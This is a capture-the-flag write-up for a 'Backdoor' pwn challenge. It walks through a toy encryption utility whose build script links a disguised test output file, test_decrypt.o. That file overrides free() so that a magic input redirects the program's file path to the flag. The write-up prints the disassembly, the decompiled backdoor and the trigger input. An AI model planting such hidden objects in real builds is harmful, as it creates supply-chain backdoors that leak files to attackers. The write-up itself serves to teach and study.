# Backdoor

Category: Pwn

## Description

> The codebase appears strangely hospitable. Some doors are open when they shouldn't be. Find the hidden passages and see who's been sneaking in.

Several files were included:

<details>
  <summary>B2SUM</summary>

```
20cdc1cc1a91b923b45dd758e3e5eebbbf32e80f569d85ded4b4ce589e6ccf4f1b6f4a6b68d2dc79df3a984892feba214b010094bd1410ce1cc83d29213dae5b  test_decrypt.o
29caf6e499979315a00f4ae13f0730cf39db6340ba79c0244d50630b0016d2fe68bbc04470b7aaffb098683c1f236708b858c4fc1df3ba1014ab5ff5c4f46b9d  test_encrypt.o
```

</details>

<details>
  <summary>build.sh</summary>

```bash
#!/bin/bash

echo "=== MAKING CLEAN BUILD ==="
rm -f *.o chal

echo "=== BUILDING DEBUG VERSION FOR TESTING ==="
for src in *.cc; do
  g++ "$src" -c -o "${src%.cc}.o" -fsanitize=undefined
done
g++ *.o -o chal -fsanitize=undefined

for input in *.i; do
  ./chal < "$input" | grep -av "^#" > "${input%.i}.o"
done

b2sum -c B2SUM --quiet
if [[ "$?" -ne 0 ]]; then
  echo "Error: Outputs do not match references."
  exit 1
fi

echo "=== BUILDING RELEASE VERSION ==="
for src in *.cc; do
  g++ -O2 "$src" -c -o "${src%.cc}.o"
done
g++ -O2 *.o -o chal

echo "=== REMOVING TEMPORARY FILES ==="
rm -f *.o

echo "=== DONE: BINARY BUILT AT chal ==="

```

</details>

<details>
  <summary>chal.cc</summary>

```c
#include <cassert>
#include <cctype>
#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>

#include "utils.h"

constexpr size_t kBufferSize = 2000;

const char* kHelloMsgPath = "hello_message";
const char* kGoodbyeMsgPath = "goodbye_message";

int main(int argc, char* argv[]) {
  {
    FILE* f = fopen(kHelloMsgPath, "r");
    assert(f != nullptr);
    int c{};
    while ((c = fgetc(f)) != EOF) {
      putchar(c);
      fflush(nullptr);
    }
    fclose(f);
  }

  char* buffer = new char[kBufferSize];
  ReadCmd(buffer, kBufferSize);

  if (strncmp(buffer, "encrypt", sizeof(buffer)) == 0) {
    size_t length = ReadAll(buffer, kBufferSize);

    for (size_t i = 0; i < length; ++i) {
      buffer[i] = static_cast<char>(static_cast<uint8_t>(buffer[i]) + 30);
    }

    for (size_t i = 0; i < length; ++i) {
      putchar(buffer[i]);
    }
    putchar('\n');
  } else if (strncmp(buffer, "decrypt", sizeof(buffer)) == 0) {
    size_t length = ReadAll(buffer, kBufferSize);

    for (size_t i = 0; i < length; ++i) {
      buffer[i] = static_cast<char>(static_cast<uint8_t>(buffer[i]) + 226);
    }

    for (size_t i = 0; i < length; ++i) {
      putchar(buffer[i]);
    }
    putchar('\n');
  } else {
    puts("INCORRECT COMMAND!");
  }

  delete[] buffer;

  {
    FILE* f = fopen(kGoodbyeMsgPath, "r");
    assert(f != nullptr);
    int c{};
    while ((c = fgetc(f)) != EOF) {
      putchar(c);
      fflush(nullptr);
    }
    fclose(f);
  }
}

```

</details>

<details>
  <summary>goodbye_message</summary>

```
# THANKS FOR USING OUR SERVICE!

```

</details>

<details>
  <summary>hello_message</summary>

```
# ENTER COMMAND ("encrypt" TO ENCRYPT, "decrypt" TO DECRYPT; FOLLOWED BY DATA; "EOF" TO END):

```

</details>

<details>
  <summary>utils.cc</summary>

```c
#include <cstdio>

size_t ReadCmd(char *buffer, size_t max_len) {
  size_t len = 0;
  int c{};
  while ((c = fgetc(stdin)) != EOF) {
    if (c == '\n') break;
    buffer[len++] = c;
    if (len + 1 >= max_len) break;
  }
  buffer[len] = '\0';
  return len;
}

size_t ReadAll(char *buffer, size_t max_len) {
  size_t len = 0;
  int c{};
  while ((c = fgetc(stdin)) != EOF) {
    buffer[len++] = c;
    if (len > 3 && buffer[len - 3] == 'E' && buffer[len - 2] == 'O' &&
        buffer[len - 1] == 'F')
      break;
    if (len + 1 >= max_len) break;
  }
  buffer[len] = '\0';
  return len;
}

```

</details>

<details>
  <summary>utils.h</summary>

```c
#pragma once

size_t ReadCmd(char *buffer, size_t max_len);
size_t ReadAll(char *buffer, size_t max_len);

```

</details>

<details>
  <summary>test_decrypt.i</summary>

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ base64 test_decrypt.i
ZGVjcnlwdAqdY2pkIB8fHh4eHh4eHh4eHx5cHh8eHh4eHh4eHh4eHh4eHh4eHh4eLiAeHh4eHh4e
Hh4eXh4eHh4eXh4qHikenl2Ak2aenR+Bk2CenSCBk1qenSGJk1SenSKCk06enSONk0ienSSNk0Ke
nSWNkzyenSaQkzZmq2UpZqcjHh4eHi3cZSihBkNmtuQiJR7hHmVhYVg+RmKDgId/jD5PUUxQTE5L
T1FHPk9RTFBMTh4eHjIeHh4eHh4eH5hwHh+WLh85KiUmrh8eHjIeHh46Hh4eHh4eHmweHh4eHh4e
Hh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh8eHh4iHg8dHh4eHh4eHh4eHh4eHh4eHh4eHh4h
Hh8eHh4eHh4eHh4eHh4eHh4eHiweHh4wHh8eHh4eHh4eHh5sHh4eHh4eHjEeHh4uHh4eHh4eHh4e
Hh4eHh4eHh4eHh59jn+Xio1/gkyBjo4ehJCDgx6JZY2NgoCXg2uRhW5/koYeHh4eHh5aHh4eHh4e
HiAeHh4iHh4eGh0dHR0dHR0+Hh4eHh4eHiAeHh4gHh4eHh4eHh4eHh4eTJGXi5J/gB5MkZKQkn+A
HkyRhpGSkJJ/gB5MkIOKf0ySg5aSHkyCf5J/HkyAkZEeTIGNi4uDjJIeTIyNkoNMZWxzS5GSf4GJ
HkyQg4p/TIOGfYSQf4uDHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4e
Hh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4ePh4eHh8eHh4kHh4eHh4eHh4eHh4eHh4eXh4e
Hh4eHh5sHh4eHh4eHh4eHh4eHh4eHx4eHh4eHh4eHh4eHh4eHjkeHh4iHh4eXh4eHh4eHh4eHh4e
Hh4eHp4fHh4eHh4eNh4eHh4eHh4nHh4eHx4eHiYeHh4eHh4eNh4eHh4eHh5EHh4eHx4eHiEeHh4e
Hh4eHh4eHh4eHh6sHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4fHh4eHh4eHh4eHh4eHh4eSh4eHiYe
Hh4hHh4eHh4eHh4eHh4eHh4erB4eHh4eHh4eHh4eHh4eHh4eHh4eHh4eHx4eHh4eHh4eHh4eHh4e
Hk8eHh4fHh4eTh4eHh4eHh4eHh4eHh4eHqweHh4eHh4ePh4eHh4eHh4eHh4eHh4eHh8eHh4eHh4e
Hx4eHh4eHh5YHh4eHx4eHh4eHh4eHh4eHh4eHh4eHh7MHh4eHh4eHh4eHh4eHh4eHh4eHh4eHh4f
Hh4eHh4eHh4eHh4eHh4ebR4eHh8eHh4gHh4eHh4eHh4eHh4eHh4ezh4eHh4eHh5OHh4eHh4eHh4e
Hh4eHh4eJh4eHh4eHh4eHh4eHh4eHmgeHh4iHh4eXh4eHh4eHh4eHh4eHh4eHrYfHh4eHh4eNh4e
Hh4eHh4nHh4eJR4eHiYeHh4eHh4eNh4eHh4eHh4fHh4eIB4eHh4eHh4eHh4eHh4eHh4eHh7+Hh4e
Hh4eHpYeHh4eHh4eKB4eHiEeHh4mHh4eHh4eHjYeHh4eHh4eJx4eHiEeHh4eHh4eHh4eHh4eHh4e
Hh4edh8eHh4eHh5BHh4eHh4eHh4eHh4eHh4eHx4eHh4eHh4eHh4eHh4eHi8eHh4hHh4eHh4eHh4e
Hh4eHh4eHh4eHs4fHh4eHh4edx4eHh4eHh4eHh4eHh4eHh8eHh4eHh4eHh4eHh4eHh5jbWQKRU9G
```

</details>

<details>
  <summary>test_encrypt.i</summary>

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ base64 test_encrypt.i
ZW5jcnlwdAphJy4o5OPj4uLi4uLi4uLi4+Ig4uPi4uLi4uLi4uLi4uLi4uLi4uLiwuLi4uLi4uLi
4uLiIuLi4uLiIuLr4uri4iklJRwCCiZHREtDUAITFRAUEBIPExULAhMVEBQQEuLi4uLi4uLi4uLi
4uLi4uLi4uLi4uLi4uLj4uLi5uLT4eLi4uLi4uLi4uLi4uLi4uLiUFdOTuLiEFVbT1ZDROIQVVZU
VkNE4hBVSlVWVFZDROIQVkdaVuIQRkNWQ+IQRFVV4hBFUU9PR1BW4hBQUVZHECkwNw9VVkNFTeLi
4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi
4uLi4uLi4uLi4uL94uLi4+Li4uji4uLi4uLi4uLi4uLi4uIi4uLi4uLi4uLi4uLi4uLi4uLi4uLi
4uLj4uLi4uLi4uLi4uLi4uLiA+Li4uPi4uLl4uLi4uLi4uLi4uLi4uLiIuLi4uLi4uLi4uLi4uLi
4uLi4uLi4uLi4+Li4uLi4uLi4uLi4uLi4gni4uLq4uLi5eLi4uLi4uLi4uLi4uLi4iLi4uLi4uLi
4uLi4uLi4uLi4uLi4uLi4uPi4uLi4uLi4uLi4uLi4uIO4uLi4+Li4hLi4uLi4uLi4uLi4uLi4uIi
4uLi4uLi4gLi4uLi4uLi4uLi4uLi4uLj4uLi4uLi4uPi4uLi4uLiF+Li4uPi4uLi4uLi4uLi4uLi
4uLi4uLiQuLi4uLi4uLi4uLi4uLi4uLi4uLi4uLi4+Li4uLi4uLi4uLi4uLi4uPi4uLk4uLi4uLi
4uLi4uLi4uLi4uLi4kLi4uLi4uLiEuLi4uLi4uLp4uLi5OLi4uri4uLi4uLi+uLi4uLi4uLr4uLi
5eLi4uLi4uLi4uLi4uLi4uLi4uJy4uLi4uLi4uji4uLi4uLi4uLi4uLi4uLj4uLi4uLi4uLi4uLi
4uLi8+Li4uXi4uLi4uLi4uLi4uLi4uLi4uLieOLi4uLi4uIn4uLi4uLi4uLi4uLi4uLi4+Li4uLi
4uLi4uLi4uLi4icxKApFT0Y=
```

</details>

<details>
  <summary>flag</summary>

```
FLAG{this_is_a_false_flag}
```

</details>

## Solution

This is a sneaky challenge, credit to zVaz for cracking it!

What we have here is a simple encryption/decryption utility. 

To use it, we must first build it using the provided `build.sh` script:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ ./build.sh
=== MAKING CLEAN BUILD ===
=== BUILDING DEBUG VERSION FOR TESTING ===
=== BUILDING RELEASE VERSION ===
=== REMOVING TEMPORARY FILES ===
=== DONE: BINARY BUILT AT chal ===
```

This first runs some tests using a debug version to test that the program input/output is
as expected, the finally creates the release version of the utility available under `chal`.

We encrypt by wrapping the payload with `encrypt` and `EOF`:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ ./chal
# ENTER COMMAND ("encrypt" TO ENCRYPT, "decrypt" TO DECRYPT; FOLLOWED BY DATA; "EOF" TO END):
encrypt
TEST
EOF
rcqr(cmd
# THANKS FOR USING OUR SERVICE!
```

Then, decrypt (well, kind-of...) by using `decrypt` instead:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ ./chal
# ENTER COMMAND ("encrypt" TO ENCRYPT, "decrypt" TO DECRYPT; FOLLOWED BY DATA; "EOF" TO END):
decrypt
rcqr(cmd
EOF
TEST
EOF�'1(
# THANKS FOR USING OUR SERVICE!
```

We know from the files provided to us that there's a file called `flag` in the challenge folder,
we just need to find a way to leak it. This part seems most tempting:

```c
  {
    FILE* f = fopen(kGoodbyeMsgPath, "r");
    assert(f != nullptr);
    int c{};
    while ((c = fgetc(f)) != EOF) {
      putchar(c);
      fflush(nullptr);
    }
    fclose(f);
  }
```

If we can find a way to override `kGoodbyeMsgPath` with `flag` (instead of the existing
`"goodbye_message"`), the program would politely print us the flag before terminating. 
But how do we override `kGoodbyeMsgPath`? Inspecting the different parts of the code closely,
there doesn't seem to be any flaw in input validation, and all user input is treated safely.

This is where the name of the challenge gives us a big hint. We shouldn't be looking for a
flaw! Instead, we should be hunting for a backdoor!

While we were focusing on `chal.cc` and `utils.cc`, we elegantly ignored the innocent-looking
test code found in the build script:

```sh
echo "=== BUILDING DEBUG VERSION FOR TESTING ==="
for src in *.cc; do
  g++ "$src" -c -o "${src%.cc}.o" -fsanitize=undefined
done
g++ *.o -o chal -fsanitize=undefined

for input in *.i; do
  ./chal < "$input" | grep -av "^#" > "${input%.i}.o"
done

b2sum -c B2SUM --quiet
if [[ "$?" -ne 0 ]]; then
  echo "Error: Outputs do not match references."
  exit 1
fi
```

Let's break down what we see above:

 1. We compile `chal.cc` and `utils.cc` to create `chal.o` and `utils.o` object files.
 2. We link the object files to a debug executable
 3. We use the debug executable to test encryption and decryption:
   a. For both `test_decrypt.i` and `test_encrypt.i`, we feed them to our debug utility
      and save the output in `test_decrypt.o` and `test_encrypt.o`
   b. We compare the output's hash to precalculated values using `b2sum` in order to verify
      that they are as expected, i.e. that encryption and decryption have produced the 
      correct output

If everything is ok, we proceed to the next section of the build script:

```sh
echo "=== BUILDING RELEASE VERSION ==="
for src in *.cc; do
  g++ -O2 "$src" -c -o "${src%.cc}.o"
done
g++ -O2 *.o -o chal
```

Seems standard, right? We just compile and link the release version here, right?

Well, it turns out that this part isn't as innocent as it seems. What it actually does
is link *all* the object files available in the current folder, which, if we look closely,
aren't just `chal.o` and `utils.o` but also `test_decrypt.o` and `test_encrypt.o`. 
And guess what, `test_decrypt.o` actually has a little surprise for us if we open it
with a disassembler:

```assembly
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ objdump -d -M intel test_decrypt.o

test_decrypt.o:     file format elf64-x86-64


Disassembly of section .text:

0000000000000000 <free>:
   0:   80 3f 62                cmp    BYTE PTR [rdi],0x62
   3:   75 48                   jne    4d <free+0x4d>
   5:   80 7f 01 63             cmp    BYTE PTR [rdi+0x1],0x63
   9:   75 42                   jne    4d <free+0x4d>
   b:   80 7f 02 63             cmp    BYTE PTR [rdi+0x2],0x63
   f:   75 3c                   jne    4d <free+0x4d>
  11:   80 7f 03 6b             cmp    BYTE PTR [rdi+0x3],0x6b
  15:   75 36                   jne    4d <free+0x4d>
  17:   80 7f 04 64             cmp    BYTE PTR [rdi+0x4],0x64
  1b:   75 30                   jne    4d <free+0x4d>
  1d:   80 7f 05 6f             cmp    BYTE PTR [rdi+0x5],0x6f
  21:   75 2a                   jne    4d <free+0x4d>
  23:   80 7f 06 6f             cmp    BYTE PTR [rdi+0x6],0x6f
  27:   75 24                   jne    4d <free+0x4d>
  29:   80 7f 07 6f             cmp    BYTE PTR [rdi+0x7],0x6f
  2d:   75 1e                   jne    4d <free+0x4d>
  2f:   80 7f 08 72             cmp    BYTE PTR [rdi+0x8],0x72
  33:   75 18                   jne    4d <free+0x4d>
  35:   48 8d 47 0b             lea    rax,[rdi+0xb]
  39:   48 89 05 00 00 00 00    mov    QWORD PTR [rip+0x0],rax        # 40 <free+0x40>
  40:   0f be 47 0a             movsx  eax,BYTE PTR [rdi+0xa]
  44:   83 e8 25                sub    eax,0x25
  47:   48 98                   cdqe
  49:   c6 04 07 00             mov    BYTE PTR [rdi+rax*1],0x0
  4d:   c3                      ret
```

Using a decomiler, this becomes:

```c
__int64 __fastcall free(_BYTE *a1)
{
  __int64 result; // rax

  if ( *a1 == 'b'
    && a1[1] == 'c'
    && a1[2] == 'c'
    && a1[3] == 'k'
    && a1[4] == 'd'
    && a1[5] == 'o'
    && a1[6] == 'o'
    && a1[7] == 'o'
    && a1[8] == 'r' )
  {
    kGoodbyeMsgPath = a1 + 11;
    result = (char)a1[10] - 37;
    a1[(int)result] = 0;
  }
  return result;
}
```

There it is, our backdoor in all its glory.

So, it's pretty clear at this stage that all we need to do is just use the backdoor
to access our flag:

```
encrypt
bcckdooorX4flag
EOF
```

Running it, we get the flag:

```console
┌──(user@kali3)-[/media/sf_CTFs/google/Backdoor]
└─$ cat output.txt | nc backdoor.2024-bq.ctfcompetition.com 1337
== proof-of-work: disabled ==
# ENTER COMMAND ("encrypt" TO ENCRYPT, "decrypt" TO DECRYPT; FOLLOWED BY DATA; "EOF" TO END):
bcckdooorX4flag
EOF�'1(
FLAG{omg_you_decrypted_the_backd00r}
```